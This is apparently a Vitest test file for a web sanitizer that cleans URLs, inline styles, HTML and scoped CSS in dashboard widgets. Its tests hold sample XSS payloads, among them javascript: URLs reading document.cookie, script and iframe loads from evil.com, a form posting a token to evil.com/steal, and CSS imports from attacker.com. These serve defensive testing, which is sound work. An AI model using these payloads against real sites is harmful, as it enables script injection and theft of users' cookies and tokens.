import { describe, expect, it } from 'vitest'
import { cleanInlineStyle, isSafeUrl, sanitizeCss, sanitizeHtml } from './sanitizer'

describe('sanitizer - isSafeUrl', () => {
  it('allows safe HTTP/HTTPS and relative URLs', () => {
    expect(isSafeUrl('https://example.com/api/data')).toBe(true)
    expect(isSafeUrl('http://192.168.1.100/status')).toBe(true)
    expect(isSafeUrl('/assets/logo.png')).toBe(true)
    expect(isSafeUrl('./img/card.png')).toBe(true)
    expect(isSafeUrl('../shared/icon.svg')).toBe(true)
    expect(isSafeUrl('#section1')).toBe(true)
    expect(isSafeUrl('?view=full')).toBe(true)
    expect(isSafeUrl('mailto:operator@iot.local')).toBe(true)
    expect(isSafeUrl('tel:+1234567890')).toBe(true)
  })

  it('rejects dangerous protocols including javascript and vbscript', () => {
    expect(isSafeUrl('javascript:alert(1)')).toBe(false)
    expect(isSafeUrl('  JAVASCRIPT:alert(document.cookie)  ')).toBe(false)
    expect(isSafeUrl('javascript\n:alert(1)')).toBe(false)
    expect(isSafeUrl('vbscript:msgbox(1)')).toBe(false)
    expect(isSafeUrl('data:text/html,<script>alert(1)</script>')).toBe(false)
    expect(isSafeUrl('data:application/javascript;base64,YWxlcnQoMSk=')).toBe(false)
  })

  it('allows safe base64 image data URIs', () => {
    expect(
      isSafeUrl(
        'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg=='
      )
    ).toBe(true)
  })
})

describe('sanitizer - cleanInlineStyle', () => {
  it('preserves benign styles', () => {
    const cleaned = cleanInlineStyle('color: red; font-size: 14px; margin-top: 10px;')
    expect(cleaned).toContain('color: red')
    expect(cleaned).toContain('font-size: 14px')
    expect(cleaned).toContain('margin-top: 10px')
  })

  it('strips dangerous CSS expressions, behavior and imports', () => {
    const dangerous =
      'color: red; width: expression(alert(1)); behavior: url(x.htc); @import url("evil.css"); background: url("javascript:alert(1)");'
    const cleaned = cleanInlineStyle(dangerous)
    expect(cleaned).toBe('color: red')
    expect(cleaned).not.toContain('expression')
    expect(cleaned).not.toContain('behavior')
    expect(cleaned).not.toContain('@import')
    expect(cleaned).not.toContain('javascript')
  })
})

describe('sanitizer - sanitizeHtml', () => {
  it('preserves valid and safe HTML structures', () => {
    const html =
      '<div class="card"><h3>Motor #1</h3><p>Current: <strong>12.5 A</strong></p><table border="1"><thead><tr><th>Key</th><th>Val</th></tr></thead><tbody><tr><td>RPM</td><td>1450</td></tr></tbody></table></div>'
    const sanitized = sanitizeHtml(html)
    expect(sanitized).toContain('<div class="card">')
    expect(sanitized).toContain('<h3>Motor #1</h3>')
    expect(sanitized).toContain('<strong>12.5 A</strong>')
    expect(sanitized).toContain('<table border="1">')
  })

  it('completely strips script tags and their contents', () => {
    const xss = '<div>Safe text<script>alert("PWNED")</script><script src="https://evil.com/evil.js"></script></div>'
    const sanitized = sanitizeHtml(xss)
    expect(sanitized).toBe('<div>Safe text</div>')
    expect(sanitized).not.toContain('script')
    expect(sanitized).not.toContain('PWNED')
  })

  it('strips inline on* event attributes from elements', () => {
    const xss =
      '<img src="/assets/photo.jpg" onerror="alert(1)" onload="alert(2)" /><button onclick="evil()">Click</button><p onmouseover="alert(3)">Hover</p>'
    const sanitized = sanitizeHtml(xss)
    expect(sanitized).toContain('<img src="/assets/photo.jpg">')
    expect(sanitized).not.toContain('onerror')
    expect(sanitized).not.toContain('onload')
    expect(sanitized).not.toContain('onclick')
    expect(sanitized).not.toContain('onmouseover')
    expect(sanitized).not.toContain('button') // button tag is also dangerous and removed
  })

  it('strips javascript: and vbscript: hrefs from anchor tags', () => {
    const xss =
      '<a href="javascript:alert(document.cookie)">Click me</a><a href="https://example.com" target="_blank">Safe link</a>'
    const sanitized = sanitizeHtml(xss)
    expect(sanitized).toContain('<a>Click me</a>')
    expect(sanitized).not.toContain('javascript:')
    expect(sanitized).toContain('href="https://example.com"')
    expect(sanitized).toContain('rel="noopener noreferrer"')
  })

  it('strips dangerous embedded elements: iframe, object, embed, base, meta, form', () => {
    const attack = `
      <iframe src="https://evil.com"></iframe>
      <object data="evil.swf"></object>
      <embed src="evil.pdf">
      <meta http-equiv="refresh" content="0;url=https://evil.com">
      <base href="https://evil.com/">
      <form action="https://evil.com/steal"><input name="token" /></form>
      <div>Allowed content</div>
    `
    const sanitized = sanitizeHtml(attack)
    expect(sanitized).not.toContain('iframe')
    expect(sanitized).not.toContain('object')
    expect(sanitized).not.toContain('embed')
    expect(sanitized).not.toContain('meta')
    expect(sanitized).not.toContain('base')
    expect(sanitized).not.toContain('form')
    expect(sanitized).not.toContain('input')
    expect(sanitized).toContain('<div>Allowed content</div>')
  })

  it('strips SVG and MathML vectors which often carry script executions', () => {
    const svgAttack =
      '<div>Safe</div><svg onload="alert(1)"><circle r="10"/><script>alert(2)</script></svg><math><mi xlink:href="javascript:alert(3)">x</mi></math>'
    const sanitized = sanitizeHtml(svgAttack)
    expect(sanitized).not.toContain('svg')
    expect(sanitized).not.toContain('math')
    expect(sanitized).not.toContain('alert')
    expect(sanitized).toContain('<div>Safe</div>')
  })

  it('prevents DOM clobbering by stripping window/document/prototype identifiers', () => {
    const clobber = '<img id="window" /><a id="document"></a><div id="__proto__"></div><span id="safe-card">Safe</span>'
    const sanitized = sanitizeHtml(clobber)
    expect(sanitized).not.toContain('id="window"')
    expect(sanitized).not.toContain('id="document"')
    expect(sanitized).not.toContain('id="__proto__"')
    expect(sanitized).toContain('id="safe-card"')
  })

  it('unwraps unknown tags without losing inner text content', () => {
    const customTag = '<unknown-tag><span>Inside custom</span></unknown-tag>'
    const sanitized = sanitizeHtml(customTag)
    expect(sanitized).toBe('<span>Inside custom</span>')
    expect(sanitized).not.toContain('unknown-tag')
  })

  it('removes HTML comments completely', () => {
    const commented = '<div><!-- [if IE]> <script>alert(1)</script> <![endif]-->Content</div>'
    const sanitized = sanitizeHtml(commented)
    expect(sanitized).toBe('<div>Content</div>')
    expect(sanitized).not.toContain('<!--')
  })
})

describe('sanitizer - sanitizeCss', () => {
  it('scopes CSS rules under the target widget selector', () => {
    const rawCss = `
      .card { background: #fff; padding: 12px; }
      .title, .subtitle { color: #333; font-weight: bold; }
    `
    const scoped = sanitizeCss(rawCss, '[data-widget-id="w-99"]')
    expect(scoped).toContain('[data-widget-id="w-99"] .card {')
    expect(scoped).toContain('[data-widget-id="w-99"] .title, [data-widget-id="w-99"] .subtitle {')
  })

  it('maps body and root selectors to the widget scope container', () => {
    const rawCss = 'body { font-family: sans-serif; } :root { --main-color: blue; }'
    const scoped = sanitizeCss(rawCss, '[data-widget-id="w-10"]')
    expect(scoped).toContain('[data-widget-id="w-10"] {\n  font-family: sans-serif;\n}')
    expect(scoped).toContain('[data-widget-id="w-10"] {\n  --main-color: blue;\n}')
  })

  it('strips dangerous CSS @import, javascript URLs and expressions', () => {
    const dangerousCss = `
      @import url("https://attacker.com/evil.css");
      @charset "UTF-8";
      .btn {
        width: expression(alert(1));
        background: url('javascript:alert(2)');
        color: #fff;
      }
    `
    const scoped = sanitizeCss(dangerousCss, '[data-widget-id="w-10"]')
    expect(scoped).not.toContain('@import')
    expect(scoped).not.toContain('@charset')
    expect(scoped).not.toContain('expression')
    expect(scoped).not.toContain('javascript:')
    expect(scoped).toContain('color: #fff;')
  })
})
